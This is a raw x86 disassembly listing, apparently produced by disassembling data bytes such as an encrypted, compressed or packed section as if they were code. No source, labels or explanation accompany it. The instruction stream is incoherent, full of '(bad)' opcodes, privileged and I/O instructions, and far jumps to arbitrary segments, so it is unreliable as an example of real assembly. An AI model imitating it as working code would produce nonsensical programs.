  41956c:	lock sbb dl,BYTE PTR [eax-0x39]
  419570:	sbb    ecx,DWORD PTR [edx]
  419572:	jle    0x4195db
  419574:	(bad)  
  419575:	lahf   
  419576:	ficom  WORD PTR [edi-0x65]
  419579:	sub    DWORD PTR [edi-0x5b],edi
  41957c:	das    
  41957d:	push   0xde0a852c
  419582:	dec    ebp
  419583:	push   ebx
  419584:	bound  esp,QWORD PTR [esi+0x483461d2]
  41958a:	xchg   BYTE PTR [edi+0x17913e89],dl
  419590:	lahf   
  419591:	mov    esp,0x680b3a64
  419596:	lock sti 
  419598:	inc    esp
  419599:	fisubr WORD PTR [edi+0x329a22ed]
  41959f:	inc    eax
  4195a0:	retf   
  4195a1:	retf   0x3090
  4195a4:	iret   
  4195a5:	lahf   
  4195a6:	ins    BYTE PTR es:[edi],dx
  4195a7:	or     eax,0x49aef398
  4195ac:	xchg   esp,eax
  4195ad:	jns    0x419533
  4195af:	dec    ebp
  4195b0:	xchg   edx,eax
  4195b1:	pop    edx
  4195b2:	(bad)  [ecx]
  4195b4:	fwait
  4195b5:	sub    ch,0xc6
  4195b8:	rcl    DWORD PTR [ebp-0x61],0x2a
  4195bc:	shr    BYTE PTR [ebp+0x66],0x4a
  4195c0:	popa   
  4195c1:	dec    ebp
  4195c2:	pop    ebx
  4195c3:	jl     0x4195aa
  4195c5:	mov    ds:0x499bcbea,al
  4195ca:	loop   0x419612
  4195cc:	add    eax,0x3dfb4bc9
  4195d1:	fisub  WORD PTR [ecx-0x7]
  4195d4:	loop   0x41955b
  4195d6:	mov    bl,0x5e
  4195d8:	sub    ebx,eax
  4195da:	nop
  4195db:	out    dx,al
  4195dc:	sbb    al,0xf
  4195de:	mov    ebp,0xfe3ca54e
  4195e3:	dec    ecx
  4195e4:	fimul  WORD PTR [ebx]
  4195e6:	inc    edi
  4195e7:	adc    bl,BYTE PTR [edx+0x17f10333]
  4195ed:	lock (bad) 
  4195ef:	xor    DWORD PTR [ebx+esi*1-0x1b1a4964],ebp
  4195f6:	lock dec ecx
  4195f8:	mov    edi,0xd3f65849
  4195fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195fe:	jne    0x41966a
  419600:	fwait
  419601:	es je  0x4195b8
  419604:	fs aam 0x56
  419607:	sub    BYTE PTR [esi-0x1f],ah
  41960a:	in     al,dx
  41960b:	ja     0x41962a
  41960d:	pop    es
  41960e:	out    dx,ax
  419610:	mov    edi,DWORD PTR [esi-0x14]
  419613:	xor    DWORD PTR [ebx+0x43b55fad],0xffffff9b
  41961a:	mov    al,ds:0x28099f67
  41961f:	mov    ch,ah
  419621:	sub    ch,bl
  419623:	sbb    eax,0xd374c7d3
  419628:	fwait
  419629:	shr    BYTE PTR [eax+eiz*8],1
  41962c:	imul   esp,DWORD PTR ds:0xf08bbda0,0x42
  419633:	mov    edi,DWORD PTR [edi+ebx*8]
  419636:	xchg   esp,eax
  419637:	fcmovne st,st(7)
  419639:	(bad)  
  41963a:	mov    ah,0x31
  41963c:	dec    edi
  41963d:	sub    DWORD PTR [edi-0x4a9cb547],ebx
  419643:	mov    DWORD PTR [eax-0x56],ecx
  419646:	loopne 0x41965f
  419648:	call   0x35ba:0xfe1515fa
  41964f:	pop    esi
  419650:	xchg   bh,cl
  419652:	nop
  419653:	jmp    0x41963e
  419655:	loope  0x41969a
  419657:	mov    eax,ds:0x690300f
  41965c:	icebp  
  41965d:	lahf   
  41965e:	das    
  41965f:	sub    DWORD PTR [esi+ecx*4-0x4637a031],ebx
  419666:	leave  
  419667:	dec    ecx
  419668:	mov    eax,0x6553aea8
  41966d:	xchg   edi,eax
  41966e:	nop
  41966f:	div    DWORD PTR [ebx+0x1e068fbc]
  419675:	adc    dl,BYTE PTR [edx]
  419677:	add    dl,ch
  419679:	call   0x8df1b7cc
  41967e:	jo     0x419682
  419680:	xchg   ebx,eax
  419681:	dec    DWORD PTR [edi-0x3e3e50dc]
  419687:	into   
  419688:	xchg   edi,eax
  419689:	fldenv [edx-0x621a9cd3]
  41968f:	cmp    eax,0x28bc2fc2
  419694:	cld    
  419695:	sub    dl,BYTE PTR [ebx+0x11ce7a34]
  41969b:	sbb    BYTE PTR [ebx+0x3e8172aa],bl
  4196a1:	and    cl,BYTE PTR [esi+0x67]
  4196a4:	adc    esp,ebp
  4196a6:	scas   al,BYTE PTR es:[edi]
  4196a7:	jbe    0x4196e3
  4196a9:	shl    al,1
  4196ab:	jns    0x419674
  4196ad:	out    0xf8,eax
  4196af:	push   esi
  4196b0:	mov    al,ds:0xd457a414
  4196b5:	cwde   
  4196b6:	nop
  4196b7:	aad    0x5b
  4196b9:	stos   BYTE PTR es:[edi],al
  4196ba:	scas   al,BYTE PTR es:[edi]
  4196bb:	xchg   ebp,eax
  4196bc:	add    dh,bl
  4196be:	mov    WORD PTR [ebx],?
  4196c0:	mov    esi,0xb1226d0a
  4196c5:	mov    edi,0x93f09790
  4196ca:	cdq    
  4196cb:	imul   ecx,edi,0x70
  4196ce:	dec    edx
  4196cf:	cli    
  4196d0:	adc    esi,ebx
  4196d2:	pop    eax
  4196d3:	sub    edi,ebx
  4196d5:	inc    edx
  4196d6:	add    eax,0xaf7a5f0f
  4196db:	mov    ds:0x6090b096,al
  4196e0:	xlat   BYTE PTR ds:[ebx]
  4196e1:	xor    esi,DWORD PTR [ebp-0x66]
  4196e4:	(bad)  
  4196e5:	fdivp  st(5),st
  4196e7:	sub    DWORD PTR [esi-0x17],edx
  4196ea:	cmp    eax,0x8ff21529
  4196ef:	clc    
  4196f0:	inc    edi
  4196f1:	pusha  
  4196f2:	sbb    ch,ah
  4196f4:	xchg   esp,eax
  4196f5:	into   
  4196f6:	int    0x49
  4196f8:	jns    0x419690
  4196fa:	pop    ecx
  4196fb:	mov    eax,0x8b8571d9
  419700:	scas   al,BYTE PTR es:[edi]
  419701:	xchg   ebx,eax
  419702:	rol    BYTE PTR [ecx+0x5c61d29b],0x50
  419709:	ror    bh,1
  41970b:	dec    ecx
  41970c:	sub    al,0x65
  41970e:	mov    al,ds:0x65bf9e7c
  419713:	ret    0xea9e
  419716:	mov    al,ds:0x1985cf9d
  41971b:	jmp    0x15ca:0x5977338f
  419722:	fld    DWORD PTR [esi]
  419724:	pop    ebx
  419725:	add    eax,0xd4e50b22
  41972a:	nop
  41972b:	xchg   ebp,eax
  41972c:	and    eax,0x6cf2f8c
  419731:	aaa    
  419732:	mov    ds:0x1230fc61,eax
  419737:	mov    esi,0x21aeca03
  41973c:	in     al,0xe9
  41973e:	iret   
  41973f:	and    ebx,ecx
  419741:	add    DWORD PTR [ebx-0x80],ebp
  419744:	cli    
  419745:	loopne 0x419711
  419747:	add    ch,BYTE PTR [ebx-0x21]
  41974a:	and    al,0xab
  41974c:	fwait
  41974d:	inc    ecx
  41974e:	stos   BYTE PTR es:[edi],al
  41974f:	imul   edi,ebx,0xffffff81
  419752:	in     eax,dx
  419753:	sbb    eax,0xf3c6de1c
  419758:	jp     0x41977e
  41975a:	out    dx,eax
  41975b:	pop    ds
  41975c:	int    0xd2
  41975e:	nop
  41975f:	cmp    eax,0x8399eeb8
  419764:	test   dh,cl
  419766:	imul   ecx,DWORD PTR [edx-0x57],0xb3c9df45
  41976d:	push   esp
  41976e:	fisttp DWORD PTR [esi]
  419770:	pushf  
  419771:	repz jle 0x419753
  419774:	cli    
  419775:	imul   esp,ecx,0x4a058383
  41977b:	push   ecx
  41977c:	and    BYTE PTR [ecx+0x6de1a86d],ah
  419782:	leave  
  419783:	stc    
  419784:	or     al,BYTE PTR [eax+eax*4+0x0]
  419788:	fwait
  419789:	inc    esi
  41978a:	add    ebp,DWORD PTR [ecx-0x1a]
  41978d:	rcr    DWORD PTR [edi+ebp*1-0xe],0xdd
  419792:	sub    bl,BYTE PTR [esi+eax*1-0x90ee434]
  419799:	xor    cl,dl
  41979b:	(bad)  
  41979c:	fs in  eax,0xdf
  41979f:	adc    BYTE PTR [edx+0x3b],0x80
  4197a3:	test   dh,bh
  4197a5:	ins    BYTE PTR es:[edi],dx
  4197a6:	pop    es
  4197a7:	dec    edx
  4197a8:	shr    al,1
  4197aa:	out    0x2e,eax
  4197ac:	addr16 mov dh,0x20
  4197af:	adc    BYTE PTR [ebx-0x3155cf56],bl
  4197b5:	mov    ds:0xe2b00419,al
  4197ba:	fiadd  DWORD PTR [eax-0x36031348]
  4197c0:	mov    cl,0x7a
  4197c2:	adc    DWORD PTR [ebp-0x65],0x6c
  4197c6:	and    ch,BYTE PTR [esi]
  4197c8:	repz push ebp
  4197ca:	sub    DWORD PTR [ebp-0x6f66129b],eax
  4197d0:	mov    esp,edi
  4197d2:	(bad)  
  4197d3:	outs   dx,DWORD PTR ds:[esi]
  4197d4:	jl     0x4197f3
  4197d6:	or     al,0xde
  4197d8:	fwait
  4197d9:	test   eax,0xec0721f4
  4197de:	bound  esp,QWORD PTR [eax+edi*8-0x23]
  4197e2:	cmp    ecx,DWORD PTR [edi]
  4197e4:	xchg   esp,eax
  4197e5:	ins    BYTE PTR es:[edi],dx
  4197e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197e7:	lahf   
  4197e8:	repz adc al,0x6c
  4197eb:	cli    
  4197ec:	fwait
  4197ed:	add    DWORD PTR [esi-0x1a6adb91],0xffffff87
  4197f4:	adc    DWORD PTR [ebx-0x37],edi
  4197f7:	jle    0x419814
  4197f9:	dec    esi
  4197fa:	arpl   di,dx
  4197fc:	fnstcw WORD PTR [ecx+0x4c]
  4197ff:	aad    0x9b
  419801:	inc    edi
  419802:	lahf   
  419803:	adc    DWORD PTR [ebx],0xfffffffa
  419806:	adc    BYTE PTR [edi-0x73],0xde
  41980a:	push   edi
  41980b:	ss rep ins BYTE PTR es:[edi],dx
  41980e:	call   0xdf41:0x9063462a
  419815:	jae    0x4197b3
  419817:	mov    edi,0x4a67cd0c
  41981c:	pop    eax
  41981d:	retf   
  41981e:	mov    ds:0xb0a38561,al
  419823:	jno    0x4197c0
  419825:	sbb    bl,dh
  419827:	aam    0xb4
  419829:	hlt    
  41982a:	jge    0x41981c
  41982c:	add    BYTE PTR [edx],cl
  41982e:	clc    
  41982f:	aad    0x7
  419831:	in     eax,0xf9
  419833:	retf   0x9e29
  419836:	sub    ebp,DWORD PTR [bp-0x2f]
  41983a:	inc    eax
  41983b:	xchg   ebp,eax
  41983c:	fwait
  41983d:	push   ds
  41983e:	pop    edi
  41983f:	icebp  
  419840:	and    eax,0x88bf8186
  419845:	fiadd  WORD PTR ds:0x8da03964
  41984b:	mov    al,ds:0xd59f269d
  419850:	mov    esi,0xb338bae8
  419855:	pop    ebp
  419856:	ret    0x245f
  419859:	cld    
  41985a:	or     ebx,DWORD PTR [ecx-0x17]
  41985d:	scas   al,BYTE PTR es:[edi]
  41985e:	mov    ?,edx
  419860:	sti    
  419861:	xchg   esp,eax
  419862:	push   esi
  419863:	vmovdqa xmm2,XMMWORD PTR [eax-0x7b2c6118]
  41986b:	outs   dx,DWORD PTR ds:[esi]
  41986c:	(bad)  
  41986d:	jg     0x419816
  41986f:	sub    eax,0xb129de5d
  419874:	sub    ecx,0xbd44cf0d
  41987a:	leave  
  41987b:	cmc    
  41987c:	sbb    BYTE PTR [edi+0x25],0x45
  419880:	test   eax,0x979960f6
  419885:	test   DWORD PTR ds:0x602bde58,esi
  41988b:	ret    0xc9bb
  41988e:	pop    ss
  41988f:	shr    DWORD PTR [eax+0x1d],0xcc
  419893:	sub    bh,BYTE PTR [ecx]
  419895:	pop    esi
  419896:	dec    esi
  419897:	dec    ecx
  419898:	jne    0x41985d
  41989a:	and    dl,BYTE PTR [ebp+0x34]
  41989d:	in     eax,0x80
  41989f:	xor    DWORD PTR [ebx-0x6c],eax
  4198a2:	aas    
  4198a3:	or     dh,BYTE PTR [edi-0x2f]
  4198a6:	xor    eax,0x9790b9c7
  4198ab:	sti    
  4198ac:	fld    TBYTE PTR [ebp+0x41]
  4198af:	add    al,0xc2
  4198b1:	clc    
  4198b2:	(bad)  
  4198b3:	dec    ecx
  4198b4:	repnz lods al,BYTE PTR ds:[esi]
  4198b6:	or     BYTE PTR [esi-0x76],dl
  4198b9:	mov    ds,WORD PTR [esi+ecx*2-0x65]
  4198bd:	cmp    DWORD PTR [ebp+eax*4+0x6],esi
  4198c1:	or     al,BYTE PTR [edi+ebp*1+0x62]
  4198c5:	sbb    al,0xf
  4198c7:	and    BYTE PTR [ecx+0x7bd7db05],ch
  4198cd:	in     al,dx
  4198ce:	loope  0x419870
  4198d0:	xor    BYTE PTR [esi-0x15fd2070],al
  4198d6:	jo     0x4198e2
  4198d8:	mov    edx,0xfe4a33b9
  4198dd:	ins    DWORD PTR es:[edi],dx
  4198de:	pop    edi
  4198df:	in     eax,0x87
  4198e1:	ins    BYTE PTR es:[edi],dx
  4198e2:	ja     0x41988b
  4198e4:	mov    edx,0x966b857b
  4198e9:	loope  0x419902
  4198eb:	(bad)  
  4198ec:	out    dx,al
  4198ed:	test   DWORD PTR [edi],edi
  4198ef:	jmp    0x2209:0x49b77045
  4198f6:	adc    al,BYTE PTR [ecx+0x56]
  4198f9:	add    DWORD PTR [edi],0xffffffe9
  4198fc:	pushf  
  4198fd:	icebp  
  4198fe:	or     DWORD PTR [esi],eax
  419900:	test   al,0x7f
  419902:	add    BYTE PTR [eax+0x78b0b01b],0x8a
  419909:	push   0xc1167eec
  41990e:	nop
  41990f:	call   0x77a7e1f9
  419914:	cmp    DWORD PTR [edi-0x79],ebp
  419917:	mov    edi,0x91d2de4e
  41991c:	sub    ch,BYTE PTR ds:0xc51e6535
  419922:	int    0x6a
  419924:	rcr    DWORD PTR [ebp+0x9],0x49
  419928:	dec    edi
  419929:	ficom  DWORD PTR [ecx]
  41992b:	cmp    bh,BYTE PTR [esi-0x20c46c23]
  419931:	jb     0x4199a5
  419933:	sar    eax,0x49
  419936:	xchg   ebx,eax
  419937:	push   es
  419938:	fsubr  DWORD PTR [ebp-0x59b86a39]
  41993e:	pop    ds
  41993f:	call   0x1d9d:0x583eddb7
  419946:	inc    ebp
  419947:	push   edi
  419948:	sti    
  419949:	pop    edx
  41994a:	sahf   
  41994b:	icebp  
  41994c:	mov    edi,0xbd4a24a8
  419951:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419952:	add    ah,BYTE PTR [edx]
  419954:	es cld 
  419956:	rol    DWORD PTR [ebx-0x64],cl
  419959:	popf   
  41995a:	mov    edi,0x8c8e8e7
  41995f:	or     al,0xda
  419961:	mov    bl,BYTE PTR ds:0x700963d1
  419967:	dec    esp
  419968:	mov    edi,DWORD PTR [edi-0x20]
  41996b:	enter  0xe53b,0xe1
  41996f:	inc    eax
  419970:	xchg   ebp,eax
  419971:	mov    edi,0x680979d7
  419976:	sub    esp,esi
  419978:	fwait
  419979:	aaa    
  41997a:	ss pop esp
  41997c:	jmp    0x695407e7
  419981:	fisubr WORD PTR [ebp+0x2433896e]
  419987:	xchg   ecx,edx
  419989:	xchg   DWORD PTR [eax+0x553aabac],edx
  41998f:	mov    ch,0xf7
  419991:	or     DWORD PTR [edi+0x4a],edi
  419994:	ficom  DWORD PTR [esi]
  419996:	add    bh,ah
  419998:	cmc    
  419999:	sub    DWORD PTR [ebp+0x1e],0xaa4c189d
  4199a0:	fiadd  WORD PTR [esi]
  4199a2:	cmp    ecx,DWORD PTR [edx]
  4199a4:	pushf  
  4199a5:	or     eax,0x2ffd4b35
  4199aa:	sub    ch,BYTE PTR [ebp+0x21ccafc8]
  4199b0:	sbb    dl,dl
  4199b2:	nop
  4199b3:	cmp    al,0x3f
  4199b5:	dec    esp
  4199b6:	scas   eax,DWORD PTR es:[edi]
  4199b7:	push   es
  4199b8:	xchg   esp,eax
  4199b9:	ins    DWORD PTR es:[edi],dx
  4199ba:	cwde   
  4199bb:	imul   cx,WORD PTR [esi-0x20],0x5fc9
  4199c1:	sub    ebp,eax
  4199c3:	jg     0x41999c
  4199c5:	xchg   DWORD PTR [eax+0xacab141],edx
  4199cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199cc:	mov    cs,WORD PTR ds:0x87614e94
  4199d2:	hlt    
  4199d3:	test   BYTE PTR [ebx+0x6ffbb09d],bh
  4199d9:	je     0x41996b
  4199db:	test   DWORD PTR [edi],esp
  4199dd:	dec    esp
  4199de:	pop    esi
  4199df:	(bad)  
  4199e0:	cld    
  4199e1:	addr16 mov ds:0x2449,al
  4199e5:	in     eax,dx
  4199e6:	dec    esi
  4199e7:	cmc    
  4199e8:	push   es
  4199e9:	xchg   esi,eax
  4199ea:	stc    
  4199eb:	loope  0x419988
  4199ed:	adc    edi,DWORD PTR [edx+0x75]
  4199f0:	push   ss
  4199f1:	cdq    
  4199f2:	aam    0x4b
  4199f4:	dec    ebx
  4199f5:	fidiv  WORD PTR [ebx*1+0x1a01631b]
  4199fc:	cmp    al,0xca
  4199fe:	nop
  4199ff:	and    BYTE PTR [eax-0x3c89f1d7],ch
  419a05:	clc    
  419a06:	lock dec ecx
  419a08:	or     BYTE PTR [esi+edx*8],0x68
  419a0c:	cwde   
  419a0d:	pop    es
  419a0e:	outs   dx,BYTE PTR ds:[esi]
  419a0f:	lds    ebx,FWORD PTR [ebx+0x63cf02d]
  419a15:	mov    dh,0xd3
  419a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a18:	fldcw  WORD PTR [ecx]
  419a1a:	bt     DWORD PTR [ebx+0x46da78],ebx
  419a21:	jne    0x1f3b53d5
  419a27:	mov    bh,0x5b
  419a29:	hlt    
  419a2a:	xlat   BYTE PTR ds:[ebx]
  419a2b:	xor    DWORD PTR [ecx-0x29],ebx
  419a2e:	jecxz  0x419a79
  419a30:	cmp    cl,BYTE PTR [eax-0x56]
  419a33:	mov    al,0x27
  419a35:	sbb    eax,0x60dabe34
  419a3a:	sbb    eax,0xc8bc3e4a
  419a3f:	imul   al
  419a41:	add    DWORD PTR [edx-0xd2c28b6],0xffffffdc
  419a48:	das    
  419a49:	jnp    0x4199e5
  419a4b:	inc    ebp
  419a4c:	(bad)  
  419a4d:	mov    ds:0x9e5cca17,eax
  419a52:	xor    al,0xc6
  419a54:	mov    ah,BYTE PTR [eax+eiz*4+0x49]
  419a58:	mov    eax,0x28443d61
  419a5d:	push   esp
  419a5e:	inc    edx
  419a5f:	test   eax,0xf458eb9b
  419a64:	add    al,0xf8
  419a66:	push   ebx
  419a67:	add    dh,BYTE PTR [ebp-0x22]
  419a6a:	ja     0x419a36
  419a6c:	sbb    DWORD PTR [esi+0x11],ecx
  419a6f:	push   ds
  419a70:	jo     0x419a9e
  419a72:	lahf   
  419a73:	xchg   BYTE PTR [edi],dl
  419a75:	sbb    BYTE PTR [ecx],dh
  419a77:	stos   BYTE PTR es:[edi],al
  419a78:	arpl   WORD PTR ss:[ebp-0x2021ba1e],di
  419a7f:	arpl   WORD PTR [edx-0x39],sp
  419a82:	lea    esi,[esi-0x9]
  419a85:	std    
  419a86:	(bad)  
  419a87:	add    edi,DWORD PTR fs:[edi]
  419a8a:	ja     0x419a65
  419a8c:	ja     0x419a4c
  419a8e:	test   DWORD PTR [esi-0x35],ebp
  419a91:	dec    esp
  419a92:	bound  ecx,QWORD PTR [edx-0x4c]
  419a95:	and    BYTE PTR [eax-0x58],cl
  419a98:	pop    ecx
  419a99:	jp     0x419a2b
  419a9b:	xchg   esp,eax
  419a9c:	je     0x419a2b
  419a9e:	sbb    bh,bl
  419aa0:	jmp    0xc141:0x1c4a5143
  419aa7:	mov    bh,BYTE PTR [ecx]
  419aa9:	loop   0x419a31
  419aab:	cwde   
  419aac:	fwait
  419aad:	inc    edx
  419aae:	test   BYTE PTR [ebx],ah
  419ab0:	cld    
  419ab1:	imul   DWORD PTR [ebp-0xc21ed33]
  419ab7:	xor    dl,BYTE PTR [edi+0x36ad3e1b]
  419abd:	xchg   ebp,eax
  419abe:	xchg   edi,eax
  419abf:	mov    DWORD PTR [ecx+ebx*8],edi
  419ac2:	(bad)
  419ac6:	clc    
  419ac7:	adc    esi,esi
  419ac9:	shl    DWORD PTR [ebx+0x78d493b9],0x4a
  419ad0:	sbb    al,0x73
  419ad2:	cmp    eax,0x8aab5fdb
  419ad7:	es fwait
  419ad9:	rcr    BYTE PTR [ebp+0x20bddee7],0xaf
  419ae0:	ficom  WORD PTR cs:[edx+0x18]
  419ae4:	fist   WORD PTR [edx+0x2a]
  419ae7:	add    DWORD PTR [edi+ebx*2+0x67023b93],esi
  419aee:	inc    eax
  419aef:	enter  0x5f99,0x3d
  419af3:	mov    edx,DWORD PTR [ecx+0x6e64633e]
  419af9:	fisub  WORD PTR [eax-0x1e]
  419afc:	fsin   
  419afe:	fwait
  419aff:	jmp    0xbd93:0x798eff4
  419b06:	imul   ecx,DWORD PTR [ebp-0x2d],0x5a
  419b0a:	add    eax,DWORD PTR [edx+0x1d]
  419b0d:	ficom  DWORD PTR [esi+0x628ef49]
  419b13:	pop    edi
  419b14:	repz loopne 0x419b1e
  419b17:	pop    ss
  419b18:	(bad)  
  419b19:	xor    BYTE PTR [eax-0x51f91bb7],dh
  419b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b20:	mov    WORD PTR [edx-0x33],es
  419b23:	dec    ecx
  419b24:	aad    0x29
  419b26:	daa    
  419b27:	outs   dx,BYTE PTR ds:[esi]
  419b28:	dec    eax
  419b29:	jns    0x419b97
  419b2b:	jns    0x419ac8
  419b2d:	cmp    DWORD PTR ds:0x8485e5aa,eax
  419b33:	lods   al,BYTE PTR ds:[esi]
  419b34:	hlt    
  419b35:	push   edx
  419b36:	add    cl,BYTE PTR [edx+0x47]
  419b39:	sub    esi,DWORD PTR [edi]
  419b3b:	imul   esp,DWORD PTR [esi-0x6d],0xcb1a9bb2
  419b42:	nop
  419b43:	idiv   BYTE PTR gs:[eax+edx*1-0x15b7b391]
  419b4b:	dec    ecx
  419b4c:	xor    esi,DWORD PTR [edx-0x5b]
  419b4f:	test   al,0x30
  419b51:	pushf  
  419b52:	push   0x45ba9bf1
  419b57:	dec    esp
  419b58:	jb     0x419b04
  419b5a:	jg     0x419b31
  419b5c:	dec    esp
  419b5d:	loope  0x419af6
  419b5f:	push   es
  419b60:	stc    
  419b61:	repz iret 
  419b63:	inc    DWORD PTR [ebx-0x6447ae4a]
  419b69:	fs stos DWORD PTR es:[edi],eax
  419b6b:	or     al,0xa2
  419b6d:	nop
  419b6e:	fstp   DWORD PTR [edx]
  419b70:	sub    bl,dh
  419b72:	mov    edi,0xe4a7e6c4
  419b77:	sub    BYTE PTR [edi-0x68eb690d],al
  419b7d:	inc    ecx
  419b7e:	pusha  
  419b7f:	push   edi
  419b80:	sbb    ecx,DWORD PTR [esp+edx*1]
  419b83:	jns    0x419bb7
  419b85:	out    0xfa,eax
  419b87:	sub    edx,eax
  419b89:	jnp    0x419b9b
  419b8b:	ror    BYTE PTR [ecx+ebp*1-0x13],0xb9
  419b90:	pushf  
  419b91:	xor    eax,0x4567f644
  419b96:	sahf   
  419b97:	gs jae 0x419b25
  419b9a:	mov    al,ds:0x4f223c4c
  419b9f:	jne    0x419b7c
  419ba1:	cli    
  419ba2:	jg     0x419bb9
  419ba4:	xlat   BYTE PTR ds:[ebx]
  419ba5:	aas    
  419ba6:	add    DWORD PTR [edi-0x56],ebx
  419ba9:	jge    0x419bd3
  419bab:	arpl   WORD PTR [edi],dx
  419bad:	push   ds
  419bae:	jg     0x419b73
  419bb0:	pop    esi
  419bb1:	lods   al,BYTE PTR ds:[esi]
  419bb3:	pop    eax
  419bb4:	add    ebx,DWORD PTR [edi]
  419bb6:	(bad)  
  419bb8:	sti    
  419bb9:	xchg   esi,eax
  419bba:	adc    eax,0x9017fe08
  419bbf:	out    0xa1,al
  419bc1:	mov    ch,dl
  419bc3:	push   edi
  419bc4:	daa    
  419bc5:	fild   WORD PTR [edx+ecx*2+0x71]
  419bc9:	jl     0x419bfb
  419bcb:	fimul  WORD PTR [ebx-0x63bf9662]
  419bd1:	(bad)  
  419bd2:	and    BYTE PTR [edx+edx*2],al
  419bd5:	jbe    0x419c0f
  419bd7:	pop    ds
  419bd8:	retf   
  419bd9:	rol    DWORD PTR [edi],0x67
  419bdc:	xchg   DWORD PTR [ebp+0x123109ed],ecx
  419be2:	fdiv   st,st(5)
  419be4:	les    esp,FWORD PTR [eax+edx*4+0x7a]
  419be8:	stc    
  419be9:	js     0x419be8
  419beb:	jecxz  0x419baf
  419bed:	or     BYTE PTR [edx+0x53],bl
  419bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bf1:	push   edx
  419bf2:	(bad)  
  419bf3:	cmp    al,0x9b
  419bf5:	xor    bl,BYTE PTR [ecx+0x42]
  419bf8:	mov    ebp,0x9b85039e
  419bfd:	ret    0x7a8c
  419c00:	sahf   
  419c01:	pop    ds
  419c02:	xor    al,0x78
  419c04:	rcr    ch,0x9c
  419c07:	sbb    dh,0xe4
  419c0a:	cdq    
  419c0b:	pop    ecx
  419c0d:	push   ebp
  419c0e:	xchg   ecx,eax
  419c0f:	adc    bl,BYTE PTR [ebx+0x5]
  419c12:	pushf  
  419c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c14:	push   0x40
  419c16:	push   esp
  419c17:	call   0x1144b6e8
  419c1c:	(bad)  [ebp-0x20fc69f0]
  419c22:	cs addr16 popf 
  419c25:	push   edi
  419c26:	nop
  419c27:	(bad)  
  419c28:	outs   dx,DWORD PTR ds:[esi]
  419c29:	xor    DWORD PTR [ebp*1-0x7c3f669b],0x81a6e923
  419c34:	imul   ebx,esi,0xffffffab
  419c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c38:	int    0xb3
  419c3a:	fnsave [edi-0x65]
  419c3d:	cmc    
  419c3e:	xchg   esp,eax
  419c3f:	or     al,0x5f
  419c41:	out    0xf,al
  419c43:	or     DWORD PTR [edi-0x22],eax
  419c46:	inc    edx
  419c47:	and    dh,BYTE PTR [ebp-0x61]
  419c4a:	fsub   DWORD PTR ds:0xc2908ac7
  419c50:	in     al,dx
  419c51:	sbb    eax,0x55528ea5
  419c56:	xchg   DWORD PTR [edx-0x5d],ecx
  419c59:	push   ebp
  419c5a:	mov    fs,esi
  419c5c:	mov    dl,0x3d
  419c5e:	add    dh,BYTE PTR [ebx+ebx*4]
  419c61:	push   edx
  419c62:	inc    esi
  419c63:	pop    edx
  419c64:	adc    al,0x22
  419c66:	and    edi,eax
  419c68:	mov    esp,0x4c5256dd
  419c6d:	jmp    0x419c1e
  419c6f:	fst    DWORD PTR [ebx]
  419c71:	loope  0x419c9a
  419c73:	ret    0xd79c
  419c76:	cmp    esi,DWORD PTR [edi+0x6b430321]
  419c7c:	or     esp,DWORD PTR [ebp+eax*8-0x44]
  419c80:	mov    dl,0xdd
  419c82:	xchg   esi,eax
  419c83:	ja     0x419c2f
  419c85:	cs jmp 0x65a2:0x9034e6e2
  419c8d:	add    BYTE PTR [edx+0x5b],dh
  419c90:	adc    esp,esi
  419c92:	cmp    BYTE PTR [ecx+0x2b1100b0],cl
  419c98:	xchg   ecx,eax
  419c99:	in     eax,dx
  419c9a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  419c9c:	pop    ebx
  419c9d:	into   
  419c9e:	(bad)  
  419ca0:	fwait
  419ca1:	(bad)  
  419ca2:	sbb    eax,0xca1136ea
  419ca7:	inc    ebp
  419ca8:	(bad)
  419cab:	push   eax
  419cac:	sbb    eax,0xb719d6b6
  419cb1:	sub    BYTE PTR [ecx+0x19621316],dl
  419cb7:	push   cs
  419cb8:	cmp    DWORD PTR ds:0x481dd54,esp
  419cbe:	stos   BYTE PTR es:[edi],al
  419cbf:	inc    ecx
  419cc0:	dec    esi
  419cc1:	fsubrp st(0),st
  419cc3:	shl    BYTE PTR [ebx-0x7c45812c],0x4f
  419cca:	nop
  419ccb:	add    bl,BYTE PTR [ebx-0x6a]
  419cce:	es pop edx
  419cd0:	xchg   ecx,eax
  419cd1:	js     0x419c8e
  419cd3:	dec    ecx
  419cd4:	hlt    
  419cd5:	test   BYTE PTR [edi],bl
  419cd7:	push   DWORD PTR [eax-0x4895c45f]
  419cdd:	fld    st(7)
  419cdf:	(bad)  
  419ce0:	sbb    ebx,DWORD PTR [ebx+0x1e]
  419ce3:	xlat   BYTE PTR ds:[ebx]
  419ce4:	mov    ds:0x5d4a59e1,eax
  419ce9:	sar    BYTE PTR [edx+eiz*8-0x73a3d7e0],0xa2
  419cf1:	gs cli 
  419cf3:	fist   DWORD PTR [eax+0xf]
  419cf6:	add    BYTE PTR [esi+0x2c4077b3],dl
  419cfc:	imul   ebx,esi,0xffffff9e
  419cff:	mov    dl,0xae
  419d01:	lods   al,BYTE PTR ds:[esi]
  419d02:	mov    esp,edx
  419d04:	sbb    bh,BYTE PTR [ebx+0x8]
  419d07:	mov    ebx,DWORD PTR [ebx+0x216dd283]
  419d0d:	or     al,0x87
  419d0f:	sub    ebp,0xffffffdd
  419d12:	jno    0x419d7f
  419d14:	iret   
  419d15:	xchg   ebx,eax
  419d16:	test   al,0xcc
  419d18:	sahf   
  419d19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d1a:	int3   
  419d1b:	ror    BYTE PTR [ecx+0x1ccde75e],1
  419d21:	add    eax,0xcff684a3
  419d26:	call   FWORD PTR [edi-0x39]
  419d29:	jno    0x419d9e
  419d2b:	push   es
  419d2c:	out    0xdd,al
  419d2e:	jbe    0x419cea
  419d30:	arpl   WORD PTR [ebp-0x224ff1e4],bx
  419d36:	or     bl,ch
  419d38:	sub    eax,0x36c8b47
  419d3d:	or     eax,0xd38a4b90
  419d42:	pop    ebp
  419d43:	dec    ebx
